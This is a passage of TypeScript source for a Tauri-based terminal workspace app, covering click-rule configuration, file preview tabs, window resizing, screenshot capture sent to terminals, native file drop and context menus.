  const rules = store.get().clickRules ?? DEFAULT_CLICK_RULES;
  el.innerHTML =
    `<div class="rg-head">click rules <span class="rg-count">⌘-click actions</span></div>` +
    `<div class="rg-body rg-cfg-body">` +
    `<div class="rg-cfg-help">First rule whose <b>pattern</b> (JS regex) matches the clicked token wins; ` +
    `<code>$1</code> is the token (shell-quoted) substituted into <b>command</b>. Any stdout opens a results panel.</div>` +
    `<textarea class="rg-cfg-ta" spellcheck="false"></textarea>` +
    `<div class="rg-cfg-row"><button class="rg-cfg-save">save</button>` +
    `<button class="rg-cfg-reset">reset</button><span class="rg-cfg-msg"></span></div>` +
    `</div>`;
  const ta = el.querySelector<HTMLTextAreaElement>(".rg-cfg-ta")!;
  const msg = el.querySelector<HTMLElement>(".rg-cfg-msg")!;
  ta.value = JSON.stringify(rules, null, 2);
  el.querySelector<HTMLElement>(".rg-cfg-save")?.addEventListener("click", () => {
    try {
      const parsed = JSON.parse(ta.value) as ClickRule[];
      if (!Array.isArray(parsed) || !parsed.every((r) => typeof r?.pattern === "string" && typeof r?.command === "string"))
        throw new Error("expected [{pattern, command}, …]");
      store.set({ clickRules: parsed });
      msg.textContent = "saved";
    } catch (e) {
      msg.textContent = String(e);
    }
  });
  el.querySelector<HTMLElement>(".rg-cfg-reset")?.addEventListener("click", () => {
    store.set({ clickRules: DEFAULT_CLICK_RULES });
    ta.value = JSON.stringify(DEFAULT_CLICK_RULES, null, 2);
    msg.textContent = "reset";
  });
}

// If `col` (0-based) sits inside a '…' / "…" / `…` span, return the unquoted
// contents — spaces and all — so ⌘-click treats a quoted path (e.g. a screenshot
// path with spaces) as one token instead of splitting on whitespace.
function quotedSpanAt(text: string, col: number): string | null {
  for (const q of ["'", '"', "`"]) {
    let from = 0;
    for (;;) {
      const open = text.indexOf(q, from);
      if (open < 0) break;
      const close = text.indexOf(q, open + 1);
      if (close < 0) break;
      if (col > open && col < close) return text.slice(open + 1, close);
      from = close + 1;
    }
  }
  return null;
}

// The word/path token under the pointer, for a ⌘-click miss (no link hit). Uses
// the screen-cell geometry to map clientX/Y to a buffer cell, then expands to the
// surrounding non-whitespace run and strips wrapping punctuation. A quoted span
// under the cursor wins (so spaces inside quotes stay together).
function wordAt(id: string, clientX: number, clientY: number): string {
  const t = tabs.get(id);
  if (!t) return "";
  const screen = (t.el.querySelector(".xterm-screen") as HTMLElement | null) ?? t.el;
  const rect = screen.getBoundingClientRect();
  const cellH = rect.height / t.term.rows || 1;
  const cellW = rect.width / t.term.cols || 1;
  const row = Math.max(0, Math.min(t.term.rows - 1, Math.floor((clientY - rect.top) / cellH)));
  const col = Math.max(0, Math.min(t.term.cols - 1, Math.floor((clientX - rect.left) / cellW)));
  const buf = t.term.buffer.active;
  const line = buf.getLine(buf.viewportY + row);
  if (!line) return "";
  const text = line.translateToString(true);
  const quoted = quotedSpanAt(text, col);
  if (quoted) return quoted;
  if (col >= text.length || /\s/.test(text[col] ?? "")) return "";
  let lo = col;
  let hi = col;
  while (lo > 0 && !/\s/.test(text[lo - 1])) lo--;
  while (hi < text.length - 1 && !/\s/.test(text[hi + 1])) hi++;
  return text
    .slice(lo, hi + 1)
    .replace(/^[('"<[{]+/, "")
    .replace(/[.,;:)\]}>'"]+$/, "");
}

// ---- per-path preview tabs ----
// Previews are dynamic dock panels keyed by path (preview:<path>), like xterm
// sessions. main.ts owns each instance's content node and renders into it;
// reactdock hosts the node. No untitled buffers: every preview names a path.
type PreviewInst = { el: HTMLElement; line?: number };
const previewInsts = new Map<string, PreviewInst>();

// Raw text of the currently-rendered text preview, keyed by its content node, so
// the meta-bar "copy" button can grab it without re-reading the file. Images
// have no entry (and no copy button).
const previewTextByNode = new WeakMap<HTMLElement, string>();

// Internal routing: which panel a file preview was opened FROM (an rg results
// panel), so the preview's "← back" returns there. Keyed by preview path, value
// is the origin panel key (e.g. `rg:<query>`). Set by the rg hit click before
// openPreviewPanel renders.
const previewOrigin = new Map<string, string>();

// Open (or focus) the preview tab for `path`. A `line` (>0) selects the
// line-numbered source view scrolled to that row; otherwise the rendered view
// (image / markdown / syntax-highlighted code).
function openPreviewPanel(
  path: string,
  line?: number,
  direction: "within" | "right" = "within",
) {
  let inst = previewInsts.get(path);
  if (!inst) {
    const el = document.createElement("div");
    el.className = "fs-preview";
    inst = { el, line };
    previewInsts.set(path, inst);
    // Delegated so it survives renderPathInto's innerHTML rewrites: "← back"
    // returns to the originating panel (internal routing).
    el.addEventListener("click", (e) => {
      const t = e.target as HTMLElement;
      const cp = t.closest<HTMLElement>(".fs-copy");
      if (cp) {
        const text = previewTextByNode.get(el);
        if (text != null) {
          navigator.clipboard.writeText(text).then(() => {
            cp.textContent = "copied";
            setTimeout(() => (cp.textContent = "copy"), 1200);
          }).catch(console.error);
        }
        return;
      }
      const b = t.closest<HTMLElement>(".fs-back");
      if (!b) return;
      const origin = b.getAttribute("data-origin");
      if (origin) activatePreviewPanel(origin);
    });
  } else {
    inst.line = line;
  }
  addPreviewPanel(path, path.split("/").pop() ?? path, inst.el, direction);
  renderPathInto(inst.el, path, line);
}

// Render `path` into `node`: images via read_image, markdown via marked, a
// `line` request via the line-numbered source view, everything else via shiki.
async function renderPathInto(node: HTMLElement, path: string, line?: number) {
  const name = path.split("/").pop() ?? path;
  const ext = (name.includes(".") ? name.split(".").pop()! : "").toLowerCase();
  const empty = (s: string) => `<div class="fs-preview-empty">${s}</div>`;
  const origin = previewOrigin.get(path);
  const back = origin
    ? `<button class="fs-back" data-origin="${escapeHtml(origin)}" title="back to ${escapeHtml(origin)}">← back</button> `
    : "";
  const isImage = !line && IMAGE_EXTS.has(ext);
  // Copy the rendered text to the clipboard (text previews only; the handler in
  // openPreviewPanel reads previewTextByNode). Images get no button.
  const copy = isImage ? "" : `<button class="fs-copy" title="copy text">copy</button> `;
  const meta =
    `<div class="fs-preview-meta">${back}${copy}<span class="fs-preview-name">${escapeHtml(name)}</span>` +
    `<br><span>${escapeHtml(line ? `${path}:${line}` : path)}</span></div>`;
  previewTextByNode.delete(node); // cleared until the new text loads
  node.innerHTML = meta + empty("loading…");

  if (isImage) {
    try {
      const url = await invoke<string>("read_image", { path });
      node.innerHTML = meta + `<img class="fs-preview-img" src="${url}" alt="" />`;
    } catch (e) {
      node.innerHTML = meta + empty(String(e));
    }
    return;
  }

  let text: string;
  try {
    text = await invoke<string>("read_text", { path });
  } catch (e) {
    node.innerHTML = meta + empty(String(e));
    return;
  }
  previewTextByNode.set(node, text); // back the meta-bar copy button

  if (line) {
    // Whole file with line numbers; the target row is highlighted and scrolled
    // to center. Syntax-highlighted via shiki (per-line spans, same trick as the
    // rg panel), falling back to escaped text if the language is unknown / shiki
    // fails. Capped so a giant source file stays responsive.
    const lines = text.split("\n");
    const CAP = 2000;
    const hi = Math.min(lines.length, CAP);
    const theme = store.get().mode === "dark" ? "github-dark" : "github-light";
    const lang = SHIKI_LANG[ext] || SHIKI_LANG[name.toLowerCase()] || "text";
    let hl: string[] | null = null;
    try {
      const html = await codeToHtml(lines.slice(0, hi).join("\n"), { lang, theme });
      hl = Array.from(
        new DOMParser().parseFromString(html, "text/html").querySelectorAll(".line"),
      ).map((s) => s.innerHTML);
    } catch {
      hl = null;
    }
    const body = lines
      .slice(0, hi)
      .map((l, i) => {
        const n = i + 1;
        const cls = n === line ? "src-line on" : "src-line";
        const num = String(n).padStart(4, " ");
        const code = hl?.[i] ?? escapeHtml(l);
        return `<div class="${cls}" data-n="${n}"><span class="src-n">${num}</span>${code || " "}</div>`;
      })
      .join("");
    const tail = hi < lines.length ? `<div class="src-elide">… ${lines.length - hi} more lines</div>` : "";
    node.innerHTML = meta + `<pre class="src-pre">${body}${tail}</pre>`;
    node.querySelector(".src-line.on")?.scrollIntoView({ block: "center" });
    return;
  }

  if (MD_EXTS.has(ext)) {
    const html = DOMPurify.sanitize(await marked.parse(text));
    node.innerHTML = meta + `<div class="md-body">${html}</div>`;
    return;
  }

  const theme = store.get().mode === "dark" ? "github-dark" : "github-light";
  const lang = SHIKI_LANG[ext] || SHIKI_LANG[name.toLowerCase()] || "text";
  try {
    const html = await codeToHtml(text, { lang, theme });
    node.innerHTML = meta + `<div class="code-body">${html}</div>`;
  } catch {
    node.innerHTML = meta + `<pre class="code-plain">${escapeHtml(text)}</pre>`;
  }
}

// On theme flip, re-render the open previews so syntax colors track light/dark
// (the line-numbered source view is shiki-colored too now). Closed instances keep
// their cached node; reopening re-renders.
store.subscribe(() => {
  for (const [path, inst] of previewInsts) {
    if (isPreviewOpen(path)) renderPathInto(inst.el, path, inst.line);
  }
  // Diff panels are shiki-colored too; re-render so +/- tracks light/dark. The
  // key (`diff:<wtPath>`) doubles as the addPreviewPanel key, so isPreviewOpen
  // matches. wtPath = key after the `diff:` prefix.
  for (const [key, inst] of diffInsts) {
    if (isPreviewOpen(key)) renderDiffInto(inst.el, key.slice("diff:".length));
  }
}, ["mode"]);

// syncToggles now reads from the plugin registry instead of a hardcoded list.
function syncToggles() {
  for (const p of allPanels()) {
    const btn = document.getElementById(`${p.id}-toggle`);
    if (btn) btn.classList.toggle("active", isOpen(p.id));
  }
}

// Activity rail compact (icons) vs big (icons + labels).
function syncSidebar(s: AppState) {
  $("#actbar").dataset.mode = s.sidebar;
  applyRailWidth();
}

// Big mode honors the persisted drag width; compact falls back to the fixed
// 44px CSS rule (clear the inline width so it isn't pinned wide).
function applyRailWidth() {
  const bar = $("#actbar");
  if (store.get().sidebar === "big") bar.style.width = `${store.get().sidebarWidth}px`;
  else bar.style.removeProperty("width");
}

// Drag the divider on the rail's right edge to resize it (big mode only); the
// width persists in the store. Pointer capture so the drag survives fast moves.
function wireRailResize() {
  const grip = $("#actbar-resize");
  grip.addEventListener("pointerdown", (e) => {
    if (store.get().sidebar !== "big") return;
    e.preventDefault();
    grip.setPointerCapture(e.pointerId);
    const startX = e.clientX;
    const startW = store.get().sidebarWidth;
    const onMove = (ev: PointerEvent) => {
      const w = Math.max(96, Math.min(360, startW + (ev.clientX - startX)));
      store.set({ sidebarWidth: w });
      applyRailWidth();
    };
    const onUp = (ev: PointerEvent) => {
      grip.releasePointerCapture(ev.pointerId);
      grip.removeEventListener("pointermove", onMove);
      grip.removeEventListener("pointerup", onUp);
    };
    grip.addEventListener("pointermove", onMove);
    grip.addEventListener("pointerup", onUp);
  });
}

// ---- store-driven view sync: skin and mode push to the DOM + controls ----
function syncSkin(s: AppState) {
  document.body.dataset.skin = s.skin;
  // Button shows the skin it switches TO.
  ($("#skin-toggle") as HTMLButtonElement).textContent = nextSkin(s.skin).toUpperCase();
  for (const t of tabs.values()) {
    t.term.options.theme = THEMES[s.skin];
    t.fit.fit();
  }
}
// "Super XP": toggle the body class that forces the grainy pixel UI font on the
// chrome (CSS in styles.css), and re-font every live terminal. The font swap
// changes the cell box, so fit() reflows cols/rows and we push the new size +
// pixel dims to the pty (mirrors the focus path; onResize also fires resize_pty
// but cellDims can change without cols/rows, so we send it explicitly).
async function syncXpPixel(s: AppState) {
  document.body.classList.toggle("xp-pixel", s.xpPixel);
  // xterm's canvas renderer measures the font synchronously; if the pixel
  // webfont isn't loaded yet it silently falls back to Menlo and the terminal
  // never changes. Load it first, then apply + reflow.
  if (s.xpPixel) {
    try {
      await document.fonts.load('16px "Perfect DOS VGA 437 Win"');
    } catch {
      // font API unavailable / load failed; apply anyway (falls back to Menlo)
    }
  }
  const family = termFontFamily();
  for (const t of tabs.values()) {
    t.term.options.fontFamily = family;
    t.term.refresh(0, t.term.rows - 1); // force a redraw with the new metrics
    t.fit.fit();
    invoke("resize_pty", {
      id: t.id, cols: t.term.cols, rows: t.term.rows, ...cellDims(t.term),
    }).catch(() => {});
  }
}
// Top toolbar (Shot / dark / skin) is opt-in: hidden unless showToolbar. Its
// functions stay reachable from the palette, so hiding it strands nothing.
function applyToolbar(s: AppState) {
  document.body.classList.toggle("show-toolbar", s.showToolbar);
}
function syncMode(s: AppState) {
  document.body.dataset.mode = s.mode;
  ($("#mode-toggle") as HTMLButtonElement).textContent =
    s.mode === "dark" ? "☀" : "☾";
}
// While true, the blur-to-hide handler stands down (the screenshot crosshair
// steals focus, which would otherwise hide us mid-capture).
let capturing = false;

// Blur-to-hide is deferred, not immediate: dragging a file in from Finder blurs
// us (the source app goes active), and an immediate hide would vanish the window
// before the drop lands. The pending hide is cancelled when a drag enters or
// focus returns.
let hideTimer: number | undefined;
function cancelHide() {
  if (hideTimer !== undefined) {
    clearTimeout(hideTimer);
    hideTimer = undefined;
  }
}

// Hide the popover, let the user crosshair-select a region, return the saved PNG
// path (null on Esc / missing Screen Recording permission). Window is restored
// before returning; the blur guard stays up briefly so the focus settling after
// show() doesn't trip click-outside-to-hide.
async function captureRegion(): Promise<string | null> {
  const win = getCurrentWindow();
  capturing = true;
  await win.hide();
  let path: string | null = null;
  try {
    path = await invoke<string>("screenshot");
  } catch (e) {
    console.error("screenshot:", e);
  }
  await win.show();
  await win.setFocus();
  setTimeout(() => (capturing = false), 300);
  return path;
}

// Write text into a terminal's pty (path or selection, space-terminated so the
// next token is separate) and focus it.
async function sendTextToTab(id: string, text: string) {
  if (!tabs.has(id)) return;
  await invoke("write_pty", { id, data: text }).catch(console.error);
  tabs.get(id)?.term.focus();
}

// Flip screen-capture recording on/off. Front owns the persisted flag; the
// backend mirrors it (and swaps the menu-bar icon) via capture_set_enabled.
// Shared by the Activity panel button and the tray menu item.
function toggleRecording() {
  const on = !store.get().captureEnabled;
  store.set({ captureEnabled: on });
  invoke("capture_set_enabled", { on }).catch(console.error);
}

// Main Shot button: capture a region and send its path to the active terminal.
async function captureToPrompt() {
  const id = activeId();
  const path = await captureRegion();
  if (path && id) await sendTextToTab(id, path + " ");
}

// Open terminals in most-recently-focused order, for the send picker.
function recentTabs(): Tab[] {
  const seen = new Set<string>();
  const out: Tab[] = [];
  for (const id of tabRecency) {
    const t = tabs.get(id);
    if (t && !seen.has(id)) {
      seen.add(id);
      out.push(t);
    }
  }
  // Any open tab not yet in the recency list (e.g. reattached on boot) trails.
  for (const [id, t] of tabs) if (!seen.has(id)) out.push(t);
  return out;
}

// "Send to" picker: a popover table of open terminals (recent first). Each row
// can receive a fresh screenshot or the active terminal's current selection.
function openSendPicker(anchor: HTMLElement) {
  document.querySelector("#send-picker")?.remove();
  const list = recentTabs();
  const pop = document.createElement("div");
  pop.id = "send-picker";
  pop.className = "send-picker";

  const sel = tabs.get(activeId() ?? "")?.term.getSelection() ?? "";
  const head = document.createElement("div");
  head.className = "send-picker-head";
  head.textContent = list.length ? "send to terminal" : "no open terminals";
  pop.appendChild(head);

  const close = () => pop.remove();
  for (const t of list) {
    const row = document.createElement("div");
    row.className = "send-row";
    const name = document.createElement("span");
    name.className = "send-name";
    name.textContent = t.name + (t.id === activeId() ? " ·" : "");
    row.appendChild(name);

    const shot = document.createElement("button");
    shot.className = "send-act";
    shot.textContent = "📷 shot";
    shot.title = "screenshot a region and send it here";
    shot.onclick = async () => {
      close();
      const path = await captureRegion();
      if (path) await sendTextToTab(t.id, path + " ");
    };
    row.appendChild(shot);

    const sendSel = document.createElement("button");
    sendSel.className = "send-act";
    sendSel.textContent = "✎ selection";
    sendSel.title = sel ? "send the highlighted text here" : "no text selected";
    sendSel.disabled = !sel;
    sendSel.onclick = () => {
      close();
      if (sel) sendTextToTab(t.id, sel + " ");
    };
    row.appendChild(sendSel);
    pop.appendChild(row);
  }

  document.body.appendChild(pop);
  const r = anchor.getBoundingClientRect();
  pop.style.left = `${Math.min(r.left, window.innerWidth - pop.offsetWidth - 8)}px`;
  pop.style.top = `${r.bottom + 2}px`;

  const onOutside = (e: PointerEvent) => {
    if (!pop.contains(e.target as Node)) {
      close();
      document.removeEventListener("pointerdown", onOutside, true);
    }
  };
  setTimeout(() => document.addEventListener("pointerdown", onOutside, true), 0);
}

function pathArg(p: string): string {
  return /\s/.test(p) ? `'${p.replace(/'/g, "'\\''")}'` : p;
}

// True from the moment a Finder drag enters until the catcher reports a drop or
// cancel. Suppresses blur-to-hide (showing the catcher blurs us) and debounces
// repeat dragenter events.
let draggingIn = false;
let dropWatchdog: number | undefined;

// Native OS file-drop without losing dockview tab-drag. The main window has the
// Tauri drag handler OFF (so HTML5 tab-drag works), which means a Finder drag
// fires a DOM dragenter here but exposes no file paths. On that dragenter we
// raise the `dropcatcher` window — the one surface WITH the native handler —
// over our exact bounds. Being always-on-top it becomes the OS drop target,
// reads the absolute paths, and emits them back via `os-file-drop`. It hides
// itself on drop/leave; a watchdog covers a cancelled drag that sends neither.
async function wireOsDrop() {
  const main = getCurrentWindow();
  const catcher = await WebviewWindow.getByLabel("dropcatcher");
  if (!catcher) return;

  const standDown = () => {
    draggingIn = false;
    if (dropWatchdog !== undefined) {
      clearTimeout(dropWatchdog);
      dropWatchdog = undefined;
    }
  };

  window.addEventListener("dragenter", async (e) => {
    if (!e.dataTransfer?.types.includes("Files")) return;
    if (draggingIn) return;
    draggingIn = true;
    cancelHide(); // the catcher taking the drag must not auto-hide us
    const pos = await main.outerPosition();
    const size = await main.outerSize();
    await catcher.setPosition(new PhysicalPosition(pos.x, pos.y));
    await catcher.setSize(new PhysicalSize(size.width, size.height));
    await catcher.show();
    // Safety net: a drag cancelled outside the app may send no drop/leave.
    dropWatchdog = window.setTimeout(() => {
      standDown();
      catcher.hide().catch(() => {});
    }, 8000);
  });

  // Catcher covers us exactly, so its drop position (physical px, window-origin)
  // maps 1:1 onto ours. Over the sprefa scope tray → add file scope; otherwise
  // paste the paths into the active terminal.
  await listen<{ paths: string[]; position: { x: number; y: number } }>(
    "os-file-drop",
    (e) => {
      standDown();
      cancelHide();
      const { paths, position } = e.payload;
      if (!paths.length) return;
      const dpr = window.devicePixelRatio || 1;
      const over = document.elementFromPoint(position.x / dpr, position.y / dpr);
      if (over?.closest("#sprefa-scope")) {
        for (const path of paths) addScope({ kind: "file", value: path });
        return;
      }
      const id = activeId();
      if (!id) return;
      pasteToActive(paths.map(pathArg).join(" ") + " ");
      tabs.get(id)?.term.focus();
    },
  );

  await listen("os-file-drop-cancel", standDown);
}

// Window edge/corner grips. decorations:false means macOS gives no native
// resize handles, and Tauri's startResizeDragging is a no-op on macOS (tao's
// drag_resize_window returns NotSupported for every direction), so we drive the
// resize ourselves: capture the pointer, track the screen-space delta, and push
// new size/position to the window. screenX/screenY are logical (CSS) px, which
// is what LogicalSize/LogicalPosition expect — no scale-factor juggling needed.
const MIN_W = 420;
const MIN_H = 320;
function wireWindowResize() {
  const win = getCurrentWindow();
  document.querySelectorAll<HTMLElement>(".rz").forEach((grip) => {
    const dir = grip.dataset.dir ?? "";
    grip.addEventListener("pointerdown", async (e) => {
      if (e.button !== 0) return;
      e.preventDefault();
      e.stopPropagation();
      const scale = await win.scaleFactor();
      const p = await win.outerPosition();
      const s = await win.outerSize();
      const ox = p.x / scale;
      const oy = p.y / scale;
      const ow = s.width / scale;
      const oh = s.height / scale;
      const startX = e.screenX;
      const startY = e.screenY;
      grip.setPointerCapture(e.pointerId);

      const onMove = (ev: PointerEvent) => {
        // The primary button is no longer down — a pointerup was missed (the
        // setSize/setPosition reflow below can swallow it via lostpointercapture
        // with no pointerup). Tear down so moves stop resizing "from far away".
        if ((ev.buttons & 1) === 0) {
          stop(ev.pointerId);
          return;
        }
        const dx = ev.screenX - startX;
        const dy = ev.screenY - startY;
        let w = ow;
        let h = oh;
        if (dir.includes("East")) w = ow + dx;
        if (dir.includes("West")) w = ow - dx;
        if (dir.includes("South")) h = oh + dy;
        if (dir.includes("North")) h = oh - dy;
        w = Math.max(w, MIN_W);
        h = Math.max(h, MIN_H);
        win.setSize(new LogicalSize(w, h));
        // West/North move the anchored (far) edge; keep it fixed by shifting the
        // origin so only the dragged edge tracks the cursor. Clamp-aware: derive
        // the shift from the clamped size, not the raw delta.
        if (dir.includes("West") || dir.includes("North")) {
          const nx = dir.includes("West") ? ox + (ow - w) : ox;
          const ny = dir.includes("North") ? oy + (oh - h) : oy;
          win.setPosition(new LogicalPosition(nx, ny));
        }
      };
      // Single idempotent teardown, reachable from every end condition.
      const stop = (pointerId: number) => {
        try {
          grip.releasePointerCapture(pointerId);
        } catch {
          // capture may already be gone
        }
        grip.removeEventListener("pointermove", onMove);
        grip.removeEventListener("pointerup", onUp);
        grip.removeEventListener("pointercancel", onUp);
        grip.removeEventListener("lostpointercapture", onUp);
        window.removeEventListener("pointerup", onUp, true);
        window.removeEventListener("pointercancel", onUp, true);
      };
      const onUp = (ev: PointerEvent) => stop(ev.pointerId);
      grip.addEventListener("pointermove", onMove);
      grip.addEventListener("pointerup", onUp);
      grip.addEventListener("pointercancel", onUp);
      // lostpointercapture fires when the reflow steals capture without a
      // pointerup; window-level up/cancel catch a release outside the grip.
      grip.addEventListener("lostpointercapture", onUp);
      window.addEventListener("pointerup", onUp, true);
      window.addEventListener("pointercancel", onUp, true);
    });
  });
}

// Contextual right-click items, keyed off what the click landed on. Row data is
// recovered from the row's title attr (file rows carry the path, activity rows
// the shot/url/text), so no per-row wiring is needed.
function ctxItemsFor(target: HTMLElement): CtxItem[] {
  const copy = (s: string) => navigator.clipboard.writeText(s).catch(() => {});

  // Any draggable entity (file/repo/rev) — result cells and fs rows carry these.
  const ent = target.closest("[data-entity-kind]") as HTMLElement | null;
  const entKind = ent?.dataset.entityKind as SprefaScopeKind | undefined;
  const entVal = ent?.dataset.entityValue ?? "";
  const scopeItems = (): CtxItem[] =>
    ent && entKind
      ? [
          {
            label: inScope(entKind, entVal) ? "Remove from selection" : "Add to selection",
            action: () => toggleScope(entKind, entVal),
          },
        ]
      : [];

  // A sprefa result cell tagged as an entity.
  if (ent && entKind) {
    const items: CtxItem[] = [...scopeItems(), { label: "Copy", action: () => copy(entVal) }];
    if (entKind === "file")
      items.push({ label: "Open (paste path)", action: () => pasteToActive(pathArg(entVal) + " ") });
    items.push(
      { sep: true },
      {
        label: "Clear selection",
        action: () => store.set({ sprefaScope: [] }),
        disabled: store.get().sprefaScope.length === 0,
      },
    );
    return items;
  }

  // An activity-timeline row.
  const actRow = target.closest("#activity-table tr.dtable-row") as HTMLElement | null;
  if (actRow?.title) {
    const data = actRow.title;
    return [
      { label: "Paste", action: () => pasteToActive(data + " ") },
      { label: "Copy", action: () => copy(data) },
    ];
  }

  // Inside a terminal.
  if (target.closest(".term-host")) {
    const id = activeId();
    const meta = id ? tabMetaById(id) : null;
    const turns = id ? tabTurns.get(id) ?? [] : [];
    const matches = id && meta ? searchTurns(turns, ledgerQuery(id, lastCtxY)) : [];
    const turnItems: CtxItem[] = [];
    const noop = () => {};
    if (matches.length && meta) {
      turnItems.push({
        label: `${matches.length} turn match${matches.length > 1 ? "es" : ""} (★ to save)`,
        action: noop,
        disabled: true,
      });
      for (const m of matches) {
        const p = m.preview.slice(0, 44);
        const star = isTurnFav(m) ? "✓" : "★";
        turnItems.push({
          label: `${star} ${m.role} · ${relTime(m.ts)} · ${p}${m.preview.length > 44 ? "…" : ""}`,
          action: () =>
            void (isTurnFav(m)
              ? unfavoriteTurn(m)
              : favoriteTurn(m, turnCwd.get(`${m.editor}:${m.session_id}`) ?? meta.cwd)),
        });
      }
      turnItems.push({ sep: true });
    } else if (meta) {
      // No match — cache may be cold (warm for next time) or no ledger text hit.
      if (id) void warmTurns(id);
      turnItems.push({
        label: turns.length ? "no turn matches selection" : "no AI session for this tab",
        action: noop,
        disabled: true,
      });
      turnItems.push({ sep: true });
    }
    return [
      ...turnItems,
      {
        label: "Paste",
        action: async () => {
          try {
            pasteToActive(await navigator.clipboard.readText());
          } catch {
            /* clipboard blocked */
          }
        },
      },
      {
        label: "Clear",
        action: () => {
          const id = activeId();
          if (id) tabs.get(id)?.term.clear();
        },
      },
      { sep: true },
      { label: "Screenshot region", action: captureToPrompt },
    ];
  }

  // Default: window-level actions.
  return [
    {
      label: "New session",
      action: openTabAtPwd,
    },
    { sep: true },
    { label: "Cycle skin", action: () => store.set({ skin: nextSkin(store.get().skin) }) },
    {
      label: store.get().xpPixel ? "Super XP: off" : "Super XP: on",
      action: () => store.set({ xpPixel: !store.get().xpPixel }),
    },
    {
      label: store.get().mode === "dark" ? "Light mode" : "Dark mode",
      action: () =>
        store.set({ mode: store.get().mode === "dark" ? "light" : "dark" }),
    },
  ];
}

function wireChrome() {
  $("#skin-toggle").onclick = () =>
    store.set({ skin: nextSkin(store.get().skin) });

  $("#mode-toggle").onclick = () =>
    store.set({ mode: store.get().mode === "dark" ? "light" : "dark" });

  $("#shot-btn").onclick = captureToPrompt;
  $("#send-menu-btn").onclick = (e) => openSendPicker(e.currentTarget as HTMLElement);

  for (const p of allPanels()) {
    const btn = document.getElementById(`${p.id}-toggle`);
    if (btn) btn.onclick = () => togglePanel(p.id);
  }
  $("#actbar-toggle").onclick = () =>
    store.set({ sidebar: store.get().sidebar === "big" ? "compact" : "big" });

  $("#config-reload").onclick = () =>
    invoke<ConfigView>("config_reload")
      .then((view) => store.set({ config: view }))
      .catch(console.error);
  $("#config-open").onclick = () => invoke("config_open").catch(console.error);

  $("#min-btn").onclick = () => getCurrentWindow().minimize();
  $("#max-btn").onclick = () => getCurrentWindow().toggleMaximize();
  $("#hide-btn").onclick = () => getCurrentWindow().hide();

  // Own the drag region in JS instead of `data-tauri-drag-region`: that attribute
  // only matches the exact event target, so grabbing the caption text (a child)
  // started a text-selection instead of a window drag. Listening on the bar and
  // routing by target covers every child.
  //
  // Drag is single-press only; maximize is a dedicated dblclick. The old code
  // toggled maximize on the *second* mousedown (detail===2) but had already
  // begun a native startDragging on the first — that drag racing the maximize
  // resize left the window in a half-drag state and spat mouse-report garbage
  // into the focused tmux/xterm. Starting the drag only on detail===1 (and
  // maximizing from dblclick) removes the race.
  const titleBar = $(".title-bar");
  const onControls = (t: EventTarget | null) =>
    !!(t as HTMLElement | null)?.closest(".title-bar-controls");
  titleBar.addEventListener("mousedown", (e) => {
    const me = e as MouseEvent;
    if (me.button !== 0 || onControls(me.target)) return;
    me.preventDefault(); // no caption text-selection / focus steal
    if (me.detail === 1) getCurrentWindow().startDragging();
  });
  titleBar.addEventListener("dblclick", (e) => {
    const me = e as MouseEvent;
    if (me.button !== 0 || onControls(me.target)) return;
    me.preventDefault();
    getCurrentWindow().toggleMaximize();
  });

}

function registerBuiltin() {
  registerPlugin({
    id: "builtin",
    // Config-panel toggles. Effects live in store.subscribe(applyToolbar /
    // syncXpPixel), so set() only flips state and any source (here, palette,
    // keymap) triggers the same effect.
    options: [
      {
        id: "showToolbar",
        label: "Show top toolbar",
        hint: "Shot / dark-mode / skin buttons (hidden by default)",
        get: () => store.get().showToolbar,
        set: (on) => store.set({ showToolbar: on }),
      },
      {
        id: "xpPixel",
        label: "Super XP (pixel font)",
        hint: "grainy bitmap font everywhere, incl. the terminal",
        get: () => store.get().xpPixel,
        set: (on) => store.set({ xpPixel: on }),
      },
      {
        id: "cdpPerf",
        label: "Browser performance mode",
        hint: "render at 1x — lower latency / better A/V sync, softer text",
        get: () => cdpPerf(),
        set: (on) => setBrowserPerf(on),
      },
    ],
    panels: [
      {
        id: "sessions",
        title: "tmux",
        icon: "▦",
        iconUrl: "/icons/BatExec_32x32_4.png",
        iconLabel: "tmux",
        html: "",
        component: TmuxPanelV2,
        onShow: () => { refreshSessions(); },
      },
      {
        id: "worktrees",
        title: "Worktrees",
        icon: "⊞",
        iconUrl: "/icons/Explorer100_32x32_4.png",
        iconLabel: "Worktrees",
        html: "",
        component: WorktreesPanelV2,
        onShow: () => { if (store.get().worktrees.length === 0) scanWorktrees(); },
      },
      {
        id: "activity",
        title: "Activity",
        icon: "◉",
        iconUrl: "/icons/Sysmon1000_32x32_4.png",
        iconLabel: "Activity",
        html: "",
        component: ActivityPanelV2,
      },
      {
        id: "favorites",
        title: "Favorites",
        icon: "★",
        iconLabel: "Favorites",
        html: "",
        component: FavoritesPanelV2,
        onShow: () => refreshFavorites(),
      },
      {
        id: "config",
        title: "Config",
        icon: "⚙",
        iconUrl: "/icons/Controls3000_32x32_4.png",
        iconLabel: "Config",
        html: `<div class="act-bar">
          <span class="spy-title">config</span>
          <span id="config-meta" class="wt-count"></span>
          <span class="spy-spacer"></span>
          <button id="config-reload" type="button">Reload</button>
          <button id="config-open" type="button">Open file</button>
        </div>
        <div id="config-body" class="cfg-body"></div>`,
        onShow: () => { if (!store.get().config) refreshConfig(); },
      },
    ],
  });
}

// ---- sprefa plugin: schema explorer over the daemon socket ----
type SprefaCol = { name: string; ty: string };
type SprefaRel = { name: string; columns: SprefaCol[]; builtin?: boolean };

const SPREFA_ROOT_KEY = "sprefa.root";
let sprefaRoot = localStorage.getItem(SPREFA_ROOT_KEY) ?? "~/projects/sprefa/v5";

function node(cls: string, ...kids: HTMLElement[]): HTMLDivElement {
  const d = document.createElement("div");
  d.className = cls;
  for (const k of kids) d.appendChild(k);
  return d;
}
function span(cls: string, text: string): HTMLSpanElement {
  const s = document.createElement("span");
  s.className = cls;
  s.textContent = text;
  return s;
}

type SprefaSite = { file: string; line: number; text: string; kind: string };

// Open a .dl/.rs file in a preview tab. `line` (>0) marks + scrolls to that row
// in the line-numbered source view; 0 opens the rendered (syntax-highlighted)
// view. Routes through the per-path tab machinery like every other preview.
function openSprefaSource(file: string, line: number) {
  openPreviewPanel(file, line > 0 ? line : undefined);
}

async function loadSprefaSites(rel: string, host: HTMLElement) {
  host.replaceChildren(node("sprefa-src-empty", span("wt-meta", "finding source…")));
  let sites: SprefaSite[] = [];
  try {
    sites = await invoke<SprefaSite[]>("sprefa_rel_source", { root: sprefaRoot, rel });
  } catch (e) {
    host.replaceChildren(node("sprefa-src-empty", span("wt-meta", String(e))));
    return;
  }
  if (sites.length === 0) {
    host.replaceChildren(
